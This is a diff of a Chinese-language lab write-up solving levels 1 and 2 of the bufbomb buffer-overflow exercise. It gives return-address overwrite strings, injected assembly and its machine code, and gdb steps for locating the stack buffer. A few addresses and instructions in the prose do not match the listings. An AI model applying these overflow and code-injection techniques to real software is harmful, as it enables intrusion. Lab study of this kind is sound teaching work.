@@ -80,6 +80,7 @@ I got the value of 0x11c1be21.
  8049075:	8b 45 08             	mov    0x8(%ebp),%eax
  8049078:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax
 ```
+（这里可以参考网上的内容）
 
 这是我们的版本：
 ```
@@ -92,7 +93,99 @@ I got the value of 0x11c1be21.
 也就是说，进入fizz的时候， **esp** 指向了ret address + 4 的单元。
 从代码可以看到 **esp** 减 *0x1c*，然后参数寄存器获取 **esp** 加 *0x20* 的内容作为与cookie 比较的值，我们只需把这一地址的值改为我们的cookie就可以了。
 
+```
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+f3 8c 04 08
+00 00 00 00
+21 be c1 11
+```
 
+> Userid: hanggi    
+ Cookie: 0x11c1be21    
+ Type string:Fizz!: You called fizz(0x2a50279f)    
+ VAILD    
+> NICE JOB!
+
+
+## level 2
+这一级别与上一级别的不同是，上一级别所要改变的参数位置离我们输入栈很近，我们可以通过更多溢出覆盖参数值。但是这一题里，所要对比的参数比较远，所以必须添加我们自己的指令，以达到更改目标变量的目的。
+
+我们需要将global_value改成我们的cookie。    
+通过 `objdump -D bufbomb | less`获得global_value地址，
+
+```
+0804d104 <global_value>:
+ 804d104:       00 00
+```
+目前global_value的值为0，也可以看到cookie变量的地址，程序运行后会变为我们的cookie值。
+
+*bang()* 函数如下(网络版省略)：
+```
+08048d4c <bang>:
+ 8048d4c:	83 ec 1c             	sub    $0x1c,%esp
+ 8048d4f:	a1 04 d1 04 08       	mov    0x804d104,%eax
+ 8048d54:	3b 05 0c d1 04 08    	cmp    0x804d10c,%eax
+```
+
+攻击指令如下：
+```
+movl $0x11c1be21, 0x0804d104
+pushl 0x08048d4c
+ret
+```
+由于是Assembly code 不需要考虑 little endian的问题,    
+先将 *global_value* 用 move 赋值为 cookie （*0x08048d4c* 前不加$ 表示地址），
+然后将 *bang()* 方程地址 *0x08048d4c* 写给esp，再执行ret指令时，程序自动跳入bang
+
+用 `gcc -m32 -c level2_p.s` 将代码编译成机器码，    
+再用 `objdump -d level2_p.o` 读取。
+```
+00000000 <.text>:
+   0:	c7 05 04 d1 04 08 21 	movl   $0x11c1be21,0x804d104
+   7:	be c1 11
+   a:	68 4c 8d 04 08       	push   $0x8048d4c
+   f:	c3                   	ret    
+```
+把代码抄入文件，    
+
+最后还要使用GDB获取输入内容存放的地址作为 ret 指令的目标地址。
+```
+$gdb bufbomb
+(gdb) b *0x8048ed9           (在地址0x8048c0d设置断点)
+(gdb) r xx -u hanggi         (随便输入点字符让程序运行到断点位置)
+(gdb) p /x $eax              (以十六进制数字形式打印%eax中的内容)
+```
+
+```
+c7 05 04 d1
+04 08 21 be
+c1 11 68 4c
+8d 04 08 c3
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+78 3b 68 55
+```
+
+> Userid: hanggi    
+ Cookie: 0x11c1be21    
+ Type string:Bang!: You set global_value to 0x11c1be21    
+ VAILD    
+> NICE JOB!
 
 
 ## title
